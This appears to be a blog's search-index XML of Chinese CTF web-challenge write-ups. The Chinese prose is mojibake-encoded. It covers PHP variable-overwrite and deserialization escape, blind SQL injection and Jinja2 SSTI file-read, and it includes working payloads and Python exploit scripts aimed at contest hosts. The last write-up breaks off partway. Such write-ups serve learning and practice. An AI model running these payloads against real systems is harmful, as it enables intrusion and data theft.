<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2019å®‰è¯¢æ¯easyseailize</title>
    <url>/2020/11/20/2019%E5%AE%89%E8%AF%A2%E6%9D%AFeasyseailize/</url>
    <content><![CDATA[<h1 id="1-è€ƒç‚¹"><a href="#1-è€ƒç‚¹" class="headerlink" title="1.è€ƒç‚¹"></a>1.è€ƒç‚¹</h1><p>ååºåˆ—åŒ–ï¼Œå˜é‡è¦†ç›–ï¼Œä»£ç å®¡è®¡</p>
<h1 id="2å‡ºå‘æ€è·¯"><a href="#2å‡ºå‘æ€è·¯" class="headerlink" title="2å‡ºå‘æ€è·¯"></a>2å‡ºå‘æ€è·¯</h1><p>è¿™é“é¢˜ç›®å¼€å±€å°±æ”¾å‡ºæ¥äº†æºç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$function = @$_GET[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$img</span>)</span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    $filter = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,$filter_arr).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">&#x27;&#x27;</span>,$img);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_SESSION)&#123;</span><br><span class="line">    <span class="keyword">unset</span>($_SESSION);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">&quot;user&quot;</span>] = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">$_SESSION[<span class="string">&#x27;function&#x27;</span>] = $function;</span><br><span class="line"></span><br><span class="line">extract($_POST);</span><br><span class="line"><span class="keyword">echo</span> $_SESSION[<span class="string">&quot;user&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(!$function)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;a href=&quot;index.php?f=highlight_file&quot;&gt;source_code&lt;/a&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!$_GET[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = base64_encode(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;img&#x27;</span>] = sha1(base64_encode($_GET[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$serialize_info = filter(serialize($_SESSION));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($function == <span class="string">&#x27;highlight_file&#x27;</span>)&#123;</span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">&#x27;phpinfo&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;phpinfo();&#x27;</span>); <span class="comment">//maybe you can find something in here!</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>($function == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    $userinfo = unserialize($serialize_info);</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(base64_decode($userinfo[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å…ˆçœ‹æœ€ä¸‹é¢çš„ï¼Œè®©ä½ å»phpinfoä¸‹é¢çœ‹ï¼Œå…¶å®èƒ½æ‰¾åˆ°ä¸€ä¸ªæ–‡ä»¶ï¼š</p>
<p><img src="image-20201120172012249.png" alt="image-20201120172012249"></p>
<p>å†ä¸Šä¸‹æŸ¥æ‰¾ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥çœ‹è§ä¸€ä¸ªfile_get_contentså‡½æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„ç›®æ ‡å°±å¾ˆæ˜ç¡®</p>
<ol>
<li>æ§åˆ¶imgå˜é‡</li>
<li>å‘ä¸Šçœ‹ï¼Œé‚£ä¹ˆå°±æ˜¯æ§åˆ¶$serialize_info</li>
<li>ç»§ç»­å‘ä¸Šï¼Œå°±æ˜¯æ§åˆ¶$_SESSION</li>
</ol>
<p>é‚£æˆ‘ä»¬çš„ç›®æ ‡å°±å¾ˆæ˜ç¡®äº†ï¼Œå°±æ˜¯å°è¯•æ§åˆ¶$_SESSIONçš„å€¼ï¼Œè¿›è¡Œååºåˆ—åŒ–çš„é‚£ä¹ˆä¸€ä¸ªæ“ä½œï¼Œä½†æ˜¯è¿™é‡Œæˆ‘ä»¬èƒ½æ§åˆ¶çš„å‚æ•°ä¸€ä¸ªä¹Ÿæ²¡æœ‰ï¼Œå¥½åœ¨é¢˜ç›®ç»™å‡ºäº†ä¸€ä¸ªåˆ©ç”¨ç‚¹</p>
<h2 id="åˆ©ç”¨ç‚¹"><a href="#åˆ©ç”¨ç‚¹" class="headerlink" title="åˆ©ç”¨ç‚¹"></a>åˆ©ç”¨ç‚¹</h2><h3 id="extract"><a href="#extract" class="headerlink" title="extract"></a>extract</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">extract($_POST);</span><br></pre></td></tr></table></figure>

<p>è¯¥å‡½æ•°å¯ä»¥å…è®¸åŠ¨æ€çš„å˜é‡ï¼ŒPHPä¸­ä½¿ç”¨å®ƒçš„åŸæ„æ˜¯æƒ³è¦ä»¤ç¨‹åºå‘˜å¯ä»¥ç¨‹åºä¸­åŠ¨æ€çš„è°ƒæ•´å¸¸é‡ï¼Œä½†æ˜¯å¦‚æœå…è®¸ç”¨æˆ·æ¥è°ƒç”¨çš„è¯å°±ä¼šå‡ºç°å˜é‡è¦†ç›–çš„é—®é¢˜ï¼Œ</p>
<p>åˆ©ç”¨æ–¹å¼ä¸ºæˆ‘ä»¬æƒ³è¦ä¿®æ”¹çš„åœ°æ–¹ï¼Œå¦‚æœæ˜¯å…è®¸ç”¨æˆ·è‡ªå®šä¹‰çš„ä¿®æ”¹$_POSTçš„å†…å®¹ï¼Œè€Œæˆ‘ä»¬æƒ³è¦ä¿®æ”¹sessionå½“ä¸­çš„å€¼çš„æ—¶å€™ï¼Œåªéœ€è¦</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">_SESSION[user]=admin</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæƒ³è¦ä¿®æ”¹getå½“ä¸­çš„å‚æ•°å®é™…ä¸Šä¹Ÿæ˜¯å¯ä»¥çš„</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">_GET[admin]=123</span><br></pre></td></tr></table></figure>

<p>ä¿®æ”¹éƒ¨åˆ†ä»£ç å¦‚ä¸‹ï¼š</p>
<p><img src="image-20201120173537064.png" alt="image-20201120173537064"></p>
<p>ä¾‹å­å¦‚ä¸‹ï¼š</p>
<p><img src="image-20201120173027594.png" alt="image-20201120173027594"></p>
<p>å¯ä»¥çœ‹è§æˆ‘ä»¬çš„sessionä¸ºguestï¼Œåˆ©ç”¨extractå‡½æ•°æˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œè¦†ç›–äº†ï¼š</p>
<p><img src="image-20201120173501957.png" alt="image-20201120173501957"></p>
<h3 id="ååºåˆ—åŒ–é€ƒé€¸"><a href="#ååºåˆ—åŒ–é€ƒé€¸" class="headerlink" title="ååºåˆ—åŒ–é€ƒé€¸"></a>ååºåˆ—åŒ–é€ƒé€¸</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$img</span>)</span>&#123;</span><br><span class="line">    $filter_arr = <span class="keyword">array</span>(<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>,<span class="string">&#x27;php5&#x27;</span>,<span class="string">&#x27;php4&#x27;</span>,<span class="string">&#x27;fl1g&#x27;</span>);</span><br><span class="line">    $filter = <span class="string">&#x27;/&#x27;</span>.implode(<span class="string">&#x27;|&#x27;</span>,$filter_arr).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> preg_replace($filter,<span class="string">&#x27;&#x27;</span>,$img);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æŸ¥çœ‹è¿™æ®µä»£ç ï¼Œä¹ä¸€çœ‹å¥½åƒæ˜¯å¯¹æˆ‘ä»¬æƒ³è¦è¾“å‡ºçš„ä¸œè¥¿è¿›è¡Œäº†ç›¸å½“ä¸¥æ ¼çš„è¿‡æ»¤ï¼Œä½†æ˜¯å®ƒä»…ä»…æ˜¯å°†æˆ‘ä»¬è¾“å…¥çš„å€¼æ›¿æ¢ä¸ºç©ºï¼Œè€Œä¸æ˜¯dieæ‰ç¨‹åºï¼Œç»“åˆååºåˆ—åŒ–çš„é€ƒé€¸ï¼Œæˆ‘ä»¬å°±å¯ä»¥è½»æ¾çš„è¾“å‡ºæˆ‘ä»¬éœ€è¦çš„å†…å®¹</p>
<p>é¦–å…ˆéœ€è¦æ˜ç™½è¿™é“é¢˜ç›®åˆ°åº•åšäº†ä»€ä¹ˆï¼Œå‡è®¾æˆ‘ä»¬ä»€ä¹ˆå‚æ•°ä¹Ÿä¸ä¼ å…¥ï¼Œæˆ‘ä»¬çœ‹è§çš„å­—ç¬¦ä¸²å¦‚ä¸‹ï¼š</p>
<p><img src="image-20201120180809647.png" alt="image-20201120180809647"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;user&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;guest&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">10</span>:<span class="string">&quot;show_image&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>æ­£å¸¸æ¥è¯´ï¼Œæˆ‘ä»¬æ˜¯ä¸å¯ä»¥æ§åˆ¶è¿™é‡Œé¢çš„å€¼çš„ï¼Œä½†æ˜¯é€šè¿‡å˜é‡è¦†ç›–æˆ‘ä»¬å°±å¯ä»¥æ§åˆ¶å…¶ä¸­çš„å€¼äº†ï¼Œä½†æ˜¯åˆæ°æ°å› ä¸ºæ˜¯å˜é‡è¦†ç›–çš„åŸå› ï¼Œæˆ‘ä»¬å¦‚æœå•çº¯çš„å†™å…¥functionä¼šå› ä¸ºå‰é¢å·²ç»æœ‰functionäº†è€Œæ— æ³•å†™å…¥ï¼Œæ­¤æ—¶æˆ‘ä»¬éœ€è¦åšçš„å°±æ˜¯æŠŠå‰é¢çš„ä¸œè¥¿åƒæ‰è‡ªå·±å†™å…¥ï¼è¿™æ ·å°±å¯ä»¥äº†ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼</p>
<p>è€Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„userå½“ä¸­çš„guestï¼Œæ­¤æ—¶æˆ‘ä»¬éœ€è¦åƒæ‰çš„å­—ç¬¦ä¸²é”®ä½</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[<span class="function"><span class="keyword">function</span>]=<span class="title">a</span>&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;function&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;gura&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">_SESSION[user]=flagflagflagflagflagflagflag&amp;_SESSION[function]=1bbbb&quot;;s:8:&quot;function&quot;;s:5:&quot;ysllz&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>è¯»åˆ°äº†æ–‡ä»¶ï¼ŒæˆåŠŸï¼Œ</p>
]]></content>
      <tags>
        <tag>BUU</tag>
        <tag>ååºåˆ—åŒ–</tag>
      </tags>
  </entry>
  <entry>
    <title>2020ä¸Šæµ·å¸‚ç½‘ç»œå®‰å…¨å¤§èµ›</title>
    <url>/2020/11/14/2020%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</url>
    <content><![CDATA[<p>æ³¨å…¥æ¯ï¼Œæ„Ÿè§‰ä¹Ÿæ˜¯è‡ªé—­çš„ä¸€å¤©orz,åƒåœ¾æ–‡ç« ï¼Œåªä¸è¿‡æ˜¯è®°å½•ä¸€ä¸‹è„šæœ¬</p>
<h1 id="åƒæ¯’ç½‘ç›˜"><a href="#åƒæ¯’ç½‘ç›˜" class="headerlink" title="åƒæ¯’ç½‘ç›˜"></a>åƒæ¯’ç½‘ç›˜</h1><p><img src="2020%E4%B8%8A%E6%B5%B7%E5%B8%82%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/QGuEzupA6iniGX9V.png!thumbnail" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_30258901&#x2F;article&#x2F;details&#x2F;96605162</span><br></pre></td></tr></table></figure>

<p>åœ¨è¿™ä¸ªğŸ”—ä¸‹æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°çš„ï¼åˆ©ç”¨æ¯”è¾ƒç®€å•ï¼Œå¦‚æœæˆ‘ä»¬éœ€è¦çš„å‚æ•°åœ¨getä¸Šï¼Œå¯ä»¥æ„é€ å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code = xx</span><br><span class="line">_GET[code] =xx</span><br><span class="line">åªéœ€è¦ä¸¤è€…ä¿æŒä¸€è‡´å³å¯</span><br></pre></td></tr></table></figure>

<p>å¦‚æœåœ¨POSTä¸Šï¼Œåˆ™åè¿‡æ¥ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?_POST[code] =xx</span><br><span class="line">code =xx</span><br></pre></td></tr></table></figure>



<p>ç”±äº$$key_2 == $value_2ä½¿å¾—POSTçš„å€¼è¢«unsetäº†ï¼Œç»•è¿‡wafï¼Œåé¢å†æ¬¡extracté€ æˆå˜é‡è¦†ç›– ç„¶åæ˜¯å¸ƒå°”ç›²æ³¨ï¼Œè¿™é‡Œç”¨â€“+ä»£æ›¿#ï¼Œä¸ç„¶ä¼šå‡ºç°é”™è¯¯æƒ…å†µ</p>
<p>é˜Ÿé‡Œå¸ˆå‚…çš„è„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url=<span class="string">&quot;http://eci-2zehpt4jc1z3f9vgcraf.cloudeci1.ichunqiu.com/index.php&quot;</span></span><br><span class="line">text=<span class="string">&#x27;&#x27;</span></span><br><span class="line">proxies=&#123;</span><br><span class="line"><span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;127.0.0.1:8080&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;https&#x27;</span>:<span class="string">&#x27;127.0.0.1:8080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/x-www-form-urlencoded&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">    l=<span class="number">28</span></span><br><span class="line">    h=<span class="number">126</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">abs</span>(h - l) &gt; <span class="number">1</span>:</span><br><span class="line">        m=(l+h)/<span class="number">2</span></span><br><span class="line">        pay=<span class="string">&quot;select flag from flag&quot;</span></span><br><span class="line">        <span class="comment">#pay=&quot;database()&quot;</span></span><br><span class="line">        e = <span class="string">&quot;(ascii(mid((&#123;&#125;),&#123;&#125;,1)))&gt;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(pay, i, m)</span><br><span class="line">        data = <span class="string">&quot;code=114514&#x27;and if((&#123;&#125;),1,0)--+&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">        <span class="comment">#print(data)</span></span><br><span class="line">        <span class="comment">#print(url+&quot;?_POST[code]=&quot;+data[&#x27;code&#x27;])</span></span><br><span class="line">        re=requests.post(url+<span class="string">&quot;?_POST[code]=&quot;</span>+data.strip(<span class="string">&#x27;code=&#x27;</span>),data=data,headers=headers)</span><br><span class="line">        <span class="comment">#print(re.text)</span></span><br><span class="line">        <span class="comment">#print(data)</span></span><br><span class="line">        <span class="comment">#exit()</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;http://gamectf.com/p/CGBU.png&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            l=m</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            h=m</span><br><span class="line">    mid_num = <span class="built_in">int</span>((l + h + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">    text += <span class="built_in">chr</span>(<span class="built_in">int</span>(h))</span><br><span class="line">    print(text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="TryToLogin"><a href="#TryToLogin" class="headerlink" title="TryToLogin"></a>TryToLogin</h1><p>è¿™é“é¢˜ç›®æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ³¨å…¥ï¼Œæ„Ÿè§‰æœ‰å¿…è¦å­¦ä¹ ä¸€ä¸‹,sprintf</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">url&#x3D;&quot;http:&#x2F;&#x2F;eci-2ze4elsbeer15p6dsvx2.cloudeci1.ichunqiu.com&#x2F;index.php&quot;</span><br><span class="line">text&#x3D;&#39;&#39;</span><br><span class="line">proxies&#x3D;&#123;</span><br><span class="line">&#39;http&#39;:&#39;127.0.0.1:8080&#39;,</span><br><span class="line">&#39;https&#39;:&#39;127.0.0.1:8080&#39;</span><br><span class="line">&#125;</span><br><span class="line">headers &#x3D; &#123;</span><br><span class="line">    &quot;Content-Type&quot;:&quot;application&#x2F;x-www-form-urlencoded&quot;</span><br><span class="line">&#125;</span><br><span class="line">for i in range(1,200):</span><br><span class="line">    l&#x3D;28</span><br><span class="line">    h&#x3D;126</span><br><span class="line">    while abs(h - l) &gt; 1:</span><br><span class="line">        m&#x3D;(l+h)&#x2F;2</span><br><span class="line">        pay&#x3D;&quot;select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database()&quot;</span><br><span class="line">        pay&#x3D;&quot;select * from fl4g&quot;</span><br><span class="line">        e &#x3D; &quot;(ascii(mid((&#123;&#125;),&#123;&#125;,1)))&gt;&#123;&#125;&quot;.format(pay, i, m)</span><br><span class="line">        data &#x3D;&quot;password&#x3D;%1$&#39;||if((&#123;&#125;),1,0)--+&quot;.format(e)+&#39;&amp;username&#x3D;admin&#39;</span><br><span class="line">        re&#x3D;requests.post(url,data&#x3D;data,headers&#x3D;headers)</span><br><span class="line">        if &#39;ç™»å½•æˆåŠŸäº†&#39; in re.text:</span><br><span class="line">            l&#x3D;m</span><br><span class="line">        else:</span><br><span class="line">            h&#x3D;m</span><br><span class="line">    text +&#x3D; chr(int(h))</span><br><span class="line">    print(text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">flag = f.read()</span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;,methods=[&#x27;GET&#x27;,&#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span>():</span></span><br><span class="line">    name = request.args.get(<span class="string">&quot;name&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    print(name)</span><br><span class="line">    <span class="keyword">if</span> name:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,name=name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/help&#x27;,methods=[&#x27;GET&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">help</span>():</span></span><br><span class="line">    <span class="built_in">help</span> = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.errorhandler(404)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">page_not_found</span>(<span class="params">e</span>):</span></span><br><span class="line">    <span class="comment">#No way to get flag!</span></span><br><span class="line">    os.system(<span class="string">&#x27;rm -f /flag&#x27;</span>)</span><br><span class="line">    url = name = request.args.get(<span class="string">&quot;name&quot;</span>) <span class="keyword">or</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    r = request.path</span><br><span class="line">    r = request.data.decode(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> r <span class="keyword">or</span> <span class="string">&#x27;popen&#x27;</span> <span class="keyword">in</span> r <span class="keyword">or</span> <span class="string">&#x27;&#123;&#123;&#x27;</span> <span class="keyword">in</span> r:</span><br><span class="line">        t = Template(<span class="string">&quot; Not found!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(t), <span class="number">404</span></span><br><span class="line">    t = Template(r + <span class="string">&quot; Not found!&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(t), <span class="number">404</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">8888</span>)</span><br></pre></td></tr></table></figure>

<p>è¿™é“é¢˜æ¯”è¾ƒæ–°æœ‰æ„æ€çš„ç‚¹åœ¨ä¸¤ä¸ªåœ°æ–¹ï¼š</p>
<p>è¿‡æ»¤äº†è¿™ä¸ªåœ°æ–¹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> r <span class="keyword">or</span> <span class="string">&#x27;popen&#x27;</span> <span class="keyword">in</span> r <span class="keyword">or</span> <span class="string">&#x27;&#123;&#123;&#x27;</span> <span class="keyword">in</span> r:</span><br></pre></td></tr></table></figure>

<p>è¿‡æ»¤äº†å·¦å³èŠ±æ‹¬å·,è¿™æ ·å­çš„æƒ…å†µä»¥å‰è‡ªå·±æ²¡æœ‰é‡è¿‡ï¼Œåæ¥çŸ¥é“å¯ä»¥è¿›è¡Œç›²æ³¨ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥å°è¯•è¯»å–æ–‡ä»¶ï¼Œè¯»å–æ–‡ä»¶çš„payloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% if self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;your file name &quot;).read()[1:2] &#x3D;&#x3D; &quot;a&quot; %&#125;~p0~&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>

<p>å¦‚æœæ»¡è¶³æ¡ä»¶ï¼Œåˆ™ä¼šè¾“å‡º<del>p0</del>ï¼Œå¦åˆ™å°±ä¸ä¼šè¾“å‡ºã€‚ç¬¬äºŒç‚¹ï¼Œæˆ‘ä»¬è¯¥è¯»å–ä»€ä¹ˆæ–‡ä»¶å‘¢ï¼Ÿ</p>
<p>è¿™é‡Œè¿ç”¨äº†os.system(â€œrm -f /flagâ€)</p>
<p>é»˜è®¤çš„è¿›ç¨‹åˆ é™¤åä¼šå­˜æ”¾åœ¨æš‚æ—¶æ–‡ä»¶ä¸­ï¼Œè¿›ç¨‹ä¸ºï¼š</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">/proc/self/fd/3</span><br></pre></td></tr></table></figure>

<p>æ•…ç¼–å†™è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">url = <span class="string">&#x27;http://eci-2ze006f3h1dkgrldoskz.cloudeci1.ichunqiu.com:8888/a&#x27;</span></span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">payload</span>):</span></span><br><span class="line">    r = requests.post(url, data=payload,headers=headers).text</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;~p0~&#x27;</span> <span class="keyword">in</span> r</span><br><span class="line"></span><br><span class="line">password  = <span class="string">&#x27;&#x27;</span></span><br><span class="line">sa=string.printable</span><br><span class="line"><span class="comment">#print(s)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> sa:</span><br><span class="line">        payload=<span class="string">&#x27;&#123;% if self.__dict__._TemplateReference__context.lipsum.__globals__.__builtins__.open(&quot;/proc/self/fd/3&quot;).read()[&#x27;</span> + <span class="built_in">str</span>(i) + <span class="string">&#x27;:&#x27;</span> + <span class="built_in">str</span>(</span><br><span class="line">            i + <span class="number">1</span>) + <span class="string">&#x27;] == &quot;&#x27;</span> + c + <span class="string">&#x27;&quot; %&#125;~p0~&#123;% endif %&#125;&#x27;</span></span><br><span class="line">        <span class="comment"># print(payload)</span></span><br><span class="line">        <span class="keyword">if</span> check(payload):</span><br><span class="line">            password += c</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    print(password)</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
  <entry>
    <title>2020ç½‘é¼æ¯phpweb</title>
    <url>/2020/10/28/2020%E7%BD%91%E9%BC%8E%E6%9D%AFphpweb/</url>
    <content><![CDATA[<h1 id="1-è®¿é—®é¡µé¢"><a href="#1-è®¿é—®é¡µé¢" class="headerlink" title="1.è®¿é—®é¡µé¢"></a>1.è®¿é—®é¡µé¢</h1><p>curl+uï¼Œå¯ä»¥æŸ¥çœ‹åˆ°è¿™äº›ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span>  <span class="attr">id</span>=<span class="string">form1</span> <span class="attr">name</span>=<span class="string">form1</span> <span class="attr">action</span>=<span class="string">&quot;index.php&quot;</span> <span class="attr">method</span>=<span class="string">post</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">hidden</span> <span class="attr">id</span>=<span class="string">func</span> <span class="attr">name</span>=<span class="string">func</span> <span class="attr">value</span>=<span class="string">&#x27;date&#x27;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">hidden</span> <span class="attr">id</span>=<span class="string">p</span> <span class="attr">name</span>=<span class="string">p</span> <span class="attr">value</span>=<span class="string">&#x27;Y-m-d h:i:s a&#x27;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>è¿™æ ·çš„è¯æˆ‘ä»¬æ¨æµ‹å®ƒå°±æ˜¯ç”¨äº†ä¸€ä¸ªcall_user_funcçš„å›è°ƒå‡½æ•°..</p>
<p>ç„¶åè‡ªå·±åœ¨è¿™é‡Œå¡äº†å¾ˆä¹…ï¼Œæœ€åæ‰æƒ³èµ·æ¥file_get_contentså‡½æ•°å¯ä»¥è¯»æ–‡ä»¶ï¼Œ</p>
